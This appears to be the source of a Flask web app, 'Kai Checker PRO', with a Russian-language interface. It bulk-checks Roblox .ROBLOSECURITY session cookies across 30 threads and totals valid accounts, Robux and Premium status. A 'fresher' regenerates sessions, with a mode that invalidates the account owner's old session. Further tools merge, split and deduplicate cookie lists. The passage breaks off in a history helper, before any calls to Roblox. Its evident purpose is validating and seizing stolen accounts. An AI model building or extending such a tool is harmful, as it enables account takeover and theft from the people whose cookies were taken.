import eventlet
eventlet.monkey_patch()

import os
import io
import re
import zipfile
import json
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

from flask import Flask, render_template_string, request, jsonify, send_file
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'kai_checker_secret_key_pro'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

CHECKER_HISTORY_FILE = "checker_history.json"
FRESHER_HISTORY_FILE = "fresher_history.json"

# [HTML-код фронтенда остается без изменений...]
HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Kai Checker PRO</title><script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#07030d;--bg-card:rgba(23,10,38,0.55);--border-card:rgba(168,85,247,0.25);--border-hover:rgba(217,70,239,0.6);--input-bg:rgba(12,5,20,0.75);--text-main:#f3e8ff;--text-muted:#a78bfa;--accent-purple:#9333ea;--accent-pink:#c026d3;--accent-glow:rgba(168,85,247,0.2);--gradient-btn:linear-gradient(135deg,#7e22ce,#a855f7)}
[data-theme="light"]{--bg:#f5f0ff;--bg-card:rgba(255,255,255,0.75);--border-card:rgba(168,85,247,0.2);--border-hover:rgba(168,85,247,0.5);--input-bg:rgba(243,232,255,0.6);--text-main:#2e1065;--text-muted:#7e22ce;--accent-purple:#7e22ce;--accent-pink:#c026d3}
*{margin:0;padding:0;box-sizing:border-box;outline:none}
body{font-family:'Plus Jakarta Sans',sans-serif;min-height:100vh;background:var(--bg);color:var(--text-main);position:relative;overflow-x:hidden;padding:24px 16px}
#particles-canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none}
.bg-glow{position:fixed;width:500px;height:500px;background:radial-gradient(circle,rgba(168,85,247,0.12) 0%,rgba(0,0,0,0) 70%);top:-100px;left:50%;transform:translateX(-50%);z-index:0;pointer-events:none;animation:pulseGlow 8s infinite alternate ease-in-out}
@keyframes pulseGlow{0%{transform:translateX(-50%) scale(1);opacity:0.5}100%{transform:translateX(-50%) scale(1.2);opacity:0.8}}
.wrapper{max-width:1350px;margin:0 auto;position:relative;z-index:1;background:var(--bg-card);border:1px solid var(--border-card);backdrop-filter:blur(20px);border-radius:28px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.05)}
.header{display:flex;justify-content:space-between;align-items:center;padding-bottom:24px;border-bottom:1px solid var(--border-card);margin-bottom:28px;flex-wrap:wrap;gap:16px}
.logo-text{font-family:'Paytone One',cursive;font-size:38px;font-weight:900;background:linear-gradient(135deg,#f472b6 0%,#d946ef 40%,#a855f7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;transform:skew(-4deg)}
.badge-pro{font-size:11px;font-weight:800;background:rgba(168,85,247,0.15);color:var(--accent-pink);padding:4px 12px;border-radius:20px;border:1px solid var(--border-card);letter-spacing:1.5px}
.stats-bar{display:flex;gap:12px;flex-wrap:wrap}
.stat-card{background:var(--input-bg);border:1px solid var(--border-card);padding:8px 16px;border-radius:16px;display:flex;flex-direction:column;align-items:center;min-width:90px}
.stat-val{font-size:16px;font-weight:800;color:var(--accent-pink)}
.stat-lbl{font-size:10px;color:var(--text-muted);font-weight:600;text-transform:uppercase}
.tabs{display:flex;gap:12px;margin-bottom:32px;background:var(--input-bg);padding:8px;border-radius:22px;border:1px solid var(--border-card);width:fit-content;flex-wrap:wrap}
.tab{padding:14px 32px;border-radius:16px;color:var(--text-muted);cursor:pointer;font-size:15px;font-weight:700;transition:all 0.3s;border:1px solid transparent;background:transparent}
.tab:hover{color:var(--text-main);background:rgba(168,85,247,0.1);border-color:rgba(168,85,247,0.2)}
.tab.active{background:var(--gradient-btn);color:#fff;border-color:rgba(255,255,255,0.15);box-shadow:0 6px 18px var(--accent-glow)}
.tab-content{display:none}
.tab-content.active{display:block}
.card{background:var(--bg-card);border:1px solid var(--border-card);border-radius:20px;padding:24px;margin-bottom:20px;transition:all 0.3s}
.card:hover{border-color:var(--border-hover);box-shadow:0 10px 25px var(--accent-glow)}
.card h2{font-size:16px;font-weight:800;margin-bottom:16px;display:flex;align-items:center;gap:8px}
.btn{padding:12px 24px;border:none;border-radius:14px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:all 0.25s;box-shadow:0 4px 12px rgba(0,0,0,0.2)}
.btn-primary{background:var(--gradient-btn)}
.btn-primary:hover{background:linear-gradient(135deg,#9333ea,#c026d3);box-shadow:0 4px 15px var(--accent-glow);transform:translateY(-1px)}
.btn-secondary{background:var(--input-bg);border:1px solid var(--border-card);color:var(--text-muted)}
.btn-secondary:hover{color:var(--text-main);border-color:var(--accent-purple)}
.btn-danger{background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);color:#fca5a5}
.btn-danger:hover{background:rgba(239,68,68,0.3)}
.btn-sm{padding:8px 16px;font-size:12px;border-radius:10px}
textarea,input[type="number"],input[type="text"]{width:100%;padding:14px;background:var(--input-bg);border:1px solid var(--border-card);border-radius:14px;color:var(--text-main);font-family:monospace;font-size:12px;transition:border-color 0.2s}
textarea:focus,input:focus{border-color:var(--accent-pink);box-shadow:0 0 8px var(--accent-glow)}
.upload-area{min-height:110px;border:2px dashed var(--border-card);border-radius:16px;background:var(--input-bg);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;transition:all 0.25s;text-align:center;padding:16px}
.upload-area:hover,.upload-area.drag-over{border-color:var(--accent-pink);background:rgba(168,85,247,0.05);box-shadow:0 0 10px var(--accent-glow)}
.result-container{margin-top:16px}
.result-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;flex-wrap:wrap;gap:6px}
.result-title{font-size:12px;font-weight:700;color:var(--text-muted)}
.action-btn-group{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
.btn-toggle-box,.btn-download-txt,.btn-download-zip{background:rgba(217,70,239,0.15);border:1px solid rgba(217,70,239,0.3);color:var(--accent-pink);padding:4px 12px;border-radius:8px;font-size:11px;font-weight:600;cursor:pointer;transition:all 0.2s}
.btn-toggle-box:hover,.btn-download-txt:hover,.btn-download-zip:hover{background:rgba(217,70,239,0.3);box-shadow:0 0 8px var(--accent-glow)}
.result-box{background:var(--input-bg);border:1px solid var(--border-card);border-radius:14px;padding:14px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text-main);white-space:pre-wrap;word-break:break-all;margin-top:6px}
.progress-bar{margin-top:12px;background:var(--input-bg);border-radius:20px;height:8px;overflow:hidden;border:1px solid var(--border-card)}
.progress-fill{height:100%;width:0%;background:var(--gradient-btn);transition:width 0.3s ease}
.progress-text{font-size:12px;color:var(--text-muted);margin-top:4px;text-align:center}
.checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
@media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
.theme-btn{background:var(--input-bg);border:1px solid var(--border-card);border-radius:30px;padding:8px 16px;cursor:pointer;font-size:12px;color:var(--text-main);font-weight:700;transition:all 0.2s}
.theme-btn:hover{border-color:var(--accent-purple)}
.footer{text-align:center;padding-top:20px;color:var(--text-muted);font-size:12px;font-weight:600;border-top:1px solid var(--border-card);margin-top:24px}
.history-card{background:var(--input-bg);border:1px solid var(--border-card);border-radius:16px;padding:16px;margin-bottom:14px}
.history-header{display:flex;justify-content:space-between;align-items:center;font-size:13px;font-weight:700;color:var(--accent-pink);flex-wrap:wrap;gap:8px}
.history-users{font-size:11px;color:var(--text-main);margin-top:6px;font-weight:600;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:20px}
.fresher-mode-btn.active-mode{background:var(--gradient-btn)!important;color:#fff!important;border-color:var(--accent-pink)!important;box-shadow:0 0 12px var(--accent-glow);transform:scale(1.02)}
.custom-alert-overlay{position:fixed;top:24px;right:24px;z-index:99999;pointer-events:none}
.custom-alert-card{pointer-events:auto;background:rgba(23,10,38,0.95);border:1px solid var(--border-hover);box-shadow:0 10px 30px rgba(0,0,0,0.5),0 0 15px var(--accent-glow);backdrop-filter:blur(12px);border-radius:16px;padding:14px 20px;display:flex;align-items:center;gap:12px;min-width:280px;max-width:360px;transform:translateY(-20px) scale(0.95);opacity:0;transition:all 0.3s}
.custom-alert-overlay.show .custom-alert-card{transform:translateY(0) scale(1);opacity:1}
.alert-icon{font-size:22px;line-height:1}
.alert-body h3{margin:0;color:#fff;font-size:13px;font-weight:700}
.alert-body p{color:var(--text-muted);font-size:12px;margin:0;word-break:break-word;font-weight:500}
.alert-close-btn{background:transparent;border:none;color:var(--text-muted);font-size:16px;cursor:pointer;padding:4px;line-height:1}
.alert-close-btn:hover{color:#fff}
</style>
</head>
<body>
<canvas id="particles-canvas"></canvas>
<div class="bg-glow"></div>
<div id="custom-alert" class="custom-alert-overlay">
    <div class="custom-alert-card">
        <div class="alert-icon">⚠️</div>
        <div class="alert-body"><h3>Внимание</h3><p id="custom-alert-msg">Вставьте кук!</p></div>
        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
    </div>
</div>
<div class="wrapper">
    <div class="header">
        <div class="logo-wrap"><span class="logo-text">KAI CHECKER</span><span class="badge-pro">PRO EDITION</span></div>
        <div class="stats-bar">
            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
        </div>
        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
    </div>
    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
    </div>
    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить кук</button></div>
                <div class="result-container" id="singleContainer" style="display:none;">
                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('singleResult','single_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼ Свернуть</button></div></div>
                    <div class="result-box" id="singleResult"></div>
                </div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка (30 Потоков)</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                <div class="progress-text" id="massProgressText">Готов к запуску</div>
                <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runMassCheckWS()" style="width:100%;" id="massBtn">🚀 Запустить массовый чек</button></div>
                <div class="result-container" id="massContainer" style="display:none;">
                    <div class="result-header"><span class="result-title">РЕЗУЛЬТАТЫ:</span><div class="action-btn-group"><button class="btn-download-zip" onclick="downloadMassZip()">📦 ZIP</button><button class="btn-download-txt" onclick="downloadTxtFromBox('massResult','mass_report.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼ Свернуть</button></div></div>
                    <div class="result-box" id="massResult"></div>
                </div>
            </div>
        </div>
    </div>
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (20 Потоков)</h2>
            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;flex-wrap:wrap;">
                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим:</span>
                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="btn btn-secondary btn-sm fresher-mode-btn" id="btnKill" onclick="setFresherMode('kill')">💀 Инвалидировать старую</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <textarea id="fresherCookies" placeholder="Вставьте куки списком..." rows="6"></textarea>
            <div style="margin-top:12px;"><button class="btn btn-primary" onclick="runFresher()">⚡ Обновить куки</button></div>
            <div class="result-container" id="fresherContainer" style="display:none;">
                <div class="result-header"><span class="result-title">ОБНОВЛЕННЫЕ КУКИ:</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox('fresherResult','refreshed_cookies.txt')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_fresherResult" onclick="toggleBox('fresherResult')">▼ Свернуть</button></div></div>
                <div class="result-box" id="fresherResult"></div>
            </div>
        </div>
    </div>
    <div class="tab-content" id="tab-history">
        <div class="card"><h2>📋 История Чекера <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="checkerHistoryList">Загрузка...</div></div>
        <div class="card"><h2>🔄 История Фрешера <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()" style="margin-left:auto;">🗑️ Очистить</button></h2><div id="fresherHistoryList">Загрузка...</div></div>
    </div>
    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="card"><h3>🔗 Слияние TXT</h3><div class="upload-area" id="mergeDropArea" onclick="document.getElementById('mergeFiles').click()"><p style="font-weight:700;">📁 Перетащите TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">выберите несколько</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div id="mergeFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><button class="btn btn-primary btn-sm" onclick="mergeCookies()" style="margin-top:12px;width:100%;">Объединить</button><div class="result-box" id="mergeResult" style="display:none;margin-top:10px;"></div></div>
            <div class="card"><h3>✂️ Разделение</h3><div class="upload-area" id="splitDropArea" onclick="document.getElementById('splitFiles').click()"><p style="font-weight:700;">📁 Загрузить TXT</p><p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или вставьте куки</p></div><input type="file" id="splitFiles" accept=".txt" multiple style="display:none;"><div id="splitFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div><textarea id="splitInput" placeholder="Или вставьте куки списком..." rows="3" style="margin-top:10px;"></textarea><div style="margin-top:10px;display:flex;align-items:center;gap:10px;"><label style="font-size:12px;font-weight:700;color:var(--text-muted);">Куков на файл:</label><input type="number" id="splitCount" value="1" min="1" style="padding:8px 12px;width:100px;"></div><button class="btn btn-primary btn-sm" onclick="splitCookies()" style="margin-top:12px;width:100%;">Разделить</button><div class="result-box" id="splitResult" style="display:none;margin-top:10px;"></div></div>
            <div class="card"><h3>🧹 Очистка</h3><textarea id="cleanInput" placeholder="Вставьте куки для дедупликации..." rows="5"></textarea><button class="btn btn-primary btn-sm" onclick="cleanCookies()" style="margin-top:12px;width:100%;">Удалить дубликаты</button><div class="result-box" id="cleanResult" style="display:none;margin-top:10px;"></div></div>
        </div>
    </div>
    <div class="footer">KAI CHECKER © ALL RIGHTS RESERVED</div>
</div>

<script>
const socket = io();
let lastMassReports = [];

socket.on('connect', function() { console.log('✅ WebSocket подключен'); });

socket.on('mass_progress', function(data) {
    document.getElementById('massProgress').style.width = Math.round((data.current / data.total) * 100) + '%';
    document.getElementById('massProgressText').textContent = '⏳ ' + data.current + '/' + data.total;
    if (data.result) {
        document.getElementById('massContainer').style.display = 'block';
        document.getElementById('massResult').style.display = 'block';
        document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
        let currentText = document.getElementById('massResult').textContent;
        if (currentText === '⏳ Массовая проверка...' || currentText === '') {
            document.getElementById('massResult').textContent = data.result;
        } else {
            document.getElementById('massResult').textContent = currentText + '\n\n' + data.result;
        }
        document.getElementById('massResult').scrollTop = document.getElementById('massResult').scrollHeight;
        if (data.full_report) { lastMassReports.push(data.full_report); }
    }
});

socket.on('mass_complete', function(data) {
    document.getElementById('massProgress').style.width = '100%';
    document.getElementById('massProgressText').textContent = '✅ Проверка завершена!';
    document.getElementById('massBtn').disabled = false;
    document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
    
    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massResult').textContent = data.message;
    document.getElementById('massResult').scrollTop = 0;

    document.getElementById('statValid').textContent = data.valid_count || 0;
    document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
    document.getElementById('statPremium').textContent = data.premium_count || 0;
});

socket.on('mass_error', function(data) {
    document.getElementById('massProgressText').textContent = '❌ ' + data.message;
    document.getElementById('massBtn').disabled = false;
    document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
    showAlert(data.message);
});

const canvas = document.getElementById('particles-canvas');
const ctx = canvas.getContext('2d');
let particles = [];
function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();
for(let i=0; i<40; i++) {
    particles.push({
        x: Math.random() * canvas.width, y: Math.random() * canvas.height,
        r: Math.random() * 2 + 1, dx: (Math.random() - 0.5) * 0.5, dy: (Math.random() - 0.5) * 0.5,
        alpha: Math.random() * 0.3 + 0.1
    });
}
function animateParticles() {
    ctx.clearRect(0,0,canvas.width,canvas.height);
    particles.forEach(p => {
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
        ctx.fillStyle = 'rgba(217, 70, 239, ' + p.alpha + ')';
        ctx.shadowBlur = 6; ctx.shadowColor = '#a855f7'; ctx.fill();
        p.x += p.dx; p.y += p.dy;
        if(p.x<0 || p.x>canvas.width) p.dx *= -1;
        if(p.y<0 || p.y>canvas.height) p.dy *= -1;
    });
    requestAnimationFrame(animateParticles);
}
animateParticles();

let alertTimeout;
function showAlert(message) {
    document.getElementById('custom-alert-msg').innerText = message || 'Вставьте кук!';
    document.getElementById('custom-alert').classList.add('show');
    clearTimeout(alertTimeout);
    alertTimeout = setTimeout(function() { document.getElementById('custom-alert').classList.remove('show'); }, 4000);
}
function closeAlert() { document.getElementById('custom-alert').classList.remove('show'); }

function toggleTheme() {
    var html = document.documentElement;
    html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark'?'light':'dark');
}

function toggleBox(boxId) {
    var box = document.getElementById(boxId);
    var btn = document.getElementById('btnToggle_' + boxId);
    if (!box) return;
    if (box.style.display === 'none') {
        box.style.display = 'block';
        if (btn) btn.textContent = '▼ Свернуть';
    } else {
        box.style.display = 'none';
        if (btn) btn.textContent = '▶ Развернуть';
    }
}

function downloadTxtFromBox(boxId, defaultFilename) {
    var box = document.getElementById(boxId);
    if (!box || !box.textContent.trim()) return showAlert('Нет данных!');
    var blob = new Blob([box.textContent], { type: 'text/plain;charset=utf-8' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url; a.download = defaultFilename;
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function setupDragAndDrop(areaId, inputId, infoId) {
    var area = document.getElementById(areaId);
    var input = document.getElementById(inputId);
    var info = document.getElementById(infoId);
    if(!area || !input) return;
    ['dragenter', 'dragover'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.add('drag-over'); }); });
    ['dragleave', 'drop'].forEach(function(e) { area.addEventListener(e, function(prev) { prev.preventDefault(); area.classList.remove('drag-over'); }); });
    area.addEventListener('drop', function(e) {
        if(e.dataTransfer.files.length) {
            input.files = e.dataTransfer.files;
            if(info) info.textContent = 'Выбрано файлов: ' + input.files.length + ' (' + input.files[0].name + ')';
        }
    });
    input.addEventListener('change', function() {
        if(this.files.length && info) {
            info.textContent = 'Выбрано файлов: ' + this.files.length + ' (' + this.files[0].name + ')';
        }
    });
}
setupDragAndDrop('massDropArea', 'massFile', 'massFileInfo');
setupDragAndDrop('mergeDropArea', 'mergeFiles', 'mergeFileInfo');
setupDragAndDrop('splitDropArea', 'splitFiles', 'splitFileInfo');

function activateTab(tabName) {
    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
    document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
    var targetBtn = document.querySelector('.tab[data-tab="' + tabName + '"]');
    var targetContent = document.getElementById('tab-' + tabName);
    if(targetBtn && targetContent) {
        targetBtn.classList.add('active');
        targetContent.classList.add('active');
        localStorage.setItem('kai_active_tab', tabName);
        if(tabName === 'history') { loadCheckerHistory(); loadFresherHistory(); }
    }
}
document.querySelectorAll('.tab').forEach(function(tab) {
    tab.addEventListener('click', function() { activateTab(this.dataset.tab); });
});
window.addEventListener('DOMContentLoaded', function() {
    activateTab(localStorage.getItem('kai_active_tab') || 'checker');
});

async function runSingleCheck() {
    var cookie = document.getElementById('singleCookie').value.trim();
    if(!cookie) return showAlert('Вставьте кук!');
    document.getElementById('singleContainer').style.display = 'block';
    document.getElementById('singleResult').style.display = 'block';
    document.getElementById('btnToggle_singleResult').textContent = '▼ Свернуть';
    document.getElementById('singleResult').textContent = '⏳ Проверка...';
    var res = await fetch('/api/single-check', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookie: cookie}) });
    var data = await res.json();
    document.getElementById('singleResult').textContent = data.report || 'Ошибка';
}

async function runMassCheckWS() {
    var file = document.getElementById('massFile').files[0];
    if(!file) return showAlert('Выберите TXT файл!');
    document.getElementById('massBtn').disabled = true;
    document.getElementById('massBtn').textContent = '⏳ Проверка...';
    document.getElementById('massProgress').style.width = '0%';
    document.getElementById('massProgressText').textContent = '⏳ Подготовка...';
    document.getElementById('massContainer').style.display = 'block';
    document.getElementById('massResult').style.display = 'block';
    document.getElementById('massResult').textContent = '⏳ Массовая проверка...';
    document.getElementById('btnToggle_massResult').textContent = '▼ Свернуть';
    lastMassReports = [];
    var fd = new FormData();
    fd.append('file', file);
    try {
        var res = await fetch('/api/mass-check-ws', { method: 'POST', body: fd });
        var data = await res.json();
        if(!data.success) {
            showAlert(data.message || 'Ошибка');
            document.getElementById('massBtn').disabled = false;
            document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
        }
    } catch(e) {
        showAlert('Ошибка соединения');
        document.getElementById('massBtn').disabled = false;
        document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
    }
}

async function downloadMassZip() {
    if (!lastMassReports.length) return showAlert('Нет отчетов!');
    var res = await fetch('/api/download-zip', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({reports: lastMassReports}) });
    var blob = await res.blob();
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url; a.download = 'accounts_reports.zip';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
}

function setFresherMode(m) {
    document.getElementById('fresherMode').value = m;
    document.getElementById('btnDup').classList.toggle('active-mode', m === 'duplicate');
    document.getElementById('btnKill').classList.toggle('active-mode', m === 'kill');
}

async function runFresher() {
    var cookies = document.getElementById('fresherCookies').value.trim();
    var mode = document.getElementById('fresherMode').value;
    if(!cookies) return showAlert('Вставьте куки!');
    document.getElementById('fresherContainer').style.display = 'block';
    document.getElementById('fresherResult').style.display = 'block';
    document.getElementById('btnToggle_fresherResult').textContent = '▼ Свернуть';
    document.getElementById('fresherResult').textContent = '⏳ Обновление...';
    var res = await fetch('/api/fresher', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({cookies: cookies, mode: mode}) });
    var data = await res.json();
    document.getElementById('fresherResult').textContent = data.only_cookies || 'Ошибка';
}

async function loadCheckerHistory() {
    var res = await fetch('/api/history/checker');
    var data = await res.json();
    var html = '';
    data.history.slice().reverse().forEach(function(i, idx) {
        var resultsText = i.results ? i.results.join('\n\n') : 'Нет результатов';
        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        var boxId = 'chk_hist_' + idx;
        var fileName = 'checker_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + (i.type === 'single' ? 'Одиночная' : 'Массовая') + ') — Валид: ' + i.valid + '/' + i.total + '</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + resultsText + '</div></div>';
    });
    document.getElementById('checkerHistoryList').innerHTML = html || 'История пуста';
}

async function loadFresherHistory() {
    var res = await fetch('/api/history/fresher');
    var data = await res.json();
    var html = '';
    data.history.slice().reverse().forEach(function(i, idx) {
        var cookiesText = i.cookies ? i.cookies.join('\n') : 'Нет кук';
        var usernames = i.usernames && i.usernames.length ? i.usernames.join(', ') : 'Неизвестно';
        var boxId = 'frs_hist_' + idx;
        var modeTitle = i.mode === 'kill' ? '💀 Убийство' : '♻️ Дублирование';
        var fileName = 'fresher_history_' + i.timestamp.replace(/[:. ]/g, '_') + '.txt';
        html += '<div class="history-card"><div class="history-header"><span>🕒 ' + i.timestamp + ' (' + modeTitle + ') — Обновлено: ' + i.refreshed_count + ' шт.</span><div class="action-btn-group"><button class="btn-download-txt" onclick="downloadTxtFromBox(\'' + boxId + '\', \'' + fileName + '\')">📥 TXT</button><button class="btn-toggle-box" id="btnToggle_' + boxId + '" onclick="toggleBox(\'' + boxId + '\')">▶ Развернуть</button></div></div><div class="history-users">👤 Аккаунты: ' + usernames + '</div><div class="result-box" id="' + boxId + '" style="display:none;">' + cookiesText + '</div></div>';
    });
    document.getElementById('fresherHistoryList').innerHTML = html || 'История пуста';
}

async function clearCheckerHistory() {
    if(!confirm('Очистить историю чекера?')) return;
    await fetch('/api/history/checker/clear', {method:'POST'});
    loadCheckerHistory();
}

async function clearFresherHistory() {
    if(!confirm('Очистить историю фрешера?')) return;
    await fetch('/api/history/fresher/clear', {method:'POST'});
    loadFresherHistory();
}

async function mergeCookies() {
    var files = document.getElementById('mergeFiles').files;
    if(files.length < 2) return showAlert('Выберите минимум 2 TXT файла!');
    var fd = new FormData();
    Array.from(files).forEach(function(f) { fd.append('files', f); });
    var box = document.getElementById('mergeResult');
    box.style.display = 'block';
    box.textContent = '⏳ Объединение...';
    var res = await fetch('/api/merge-cookies', {method:'POST', body:fd});
    var data = await res.json();
    if(data.success) {
        box.innerHTML = '✅ Успешно! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
    } else {
        box.textContent = '❌ Ошибка';
    }
}

async function splitCookies() {
    var files = document.getElementById('splitFiles').files;
    var textInput = document.getElementById('splitInput').value;
    var perFile = parseInt(document.getElementById('splitCount').value) || 1;
    if(!files.length && !textInput.trim()) return showAlert('Загрузите файл или вставьте куки!');
    var fd = new FormData();
    Array.from(files).forEach(function(f) { fd.append('files', f); });
    fd.append('text', textInput);
    fd.append('per_file', perFile);
    var box = document.getElementById('splitResult');
    box.style.display = 'block';
    box.textContent = '⏳ Разделение...';
    var res = await fetch('/api/split-cookies', {method:'POST', body:fd});
    var data = await res.json();
    if(data.success) {
        box.innerHTML = '✅ Разделено на ' + data.total_files + ' файлов! <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📦 Скачать ZIP</a>';
    } else {
        box.textContent = data.message || '❌ Ошибка';
    }
}

async function cleanCookies() {
    var content = document.getElementById('cleanInput').value;
    if(!content.trim()) return showAlert('Вставьте куки!');
    var box = document.getElementById('cleanResult');
    box.style.display = 'block';
    box.textContent = '⏳ Очистка...';
    var res = await fetch('/api/clean-cookies', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content: content})});
    var data = await res.json();
    if(data.success) {
        box.innerHTML = '✅ Уникальных: ' + data.count + ' шт. <a href="' + data.download_url + '" style="color:var(--accent-pink);font-weight:700;">📥 Скачать</a>';
    } else {
        box.textContent = '❌ Ошибка';
    }
}
</script>
</body>
</html>"""

# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
def read_json_file(path):
    if not os.path.exists(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return []

def write_json_file(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Ошибка записи {path}: {e}")

def save_checker_history_entry(entry_type, valid, total, usernames, results):
    history = read_json_file(CHECKER_HISTORY_FILE)
    history.append({
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "type": entry_type,
        "valid": valid,
        "total": total,
        "usernames": usernames,
        "results": results
    })
    write_json_file(CHECKER_HISTORY_FILE, history)

def save_fresher_history_entry(mode, refreshed_count, usernames, cookies):
    history = read_json_file(FRESHER_HISTORY_FILE)
    history.append({
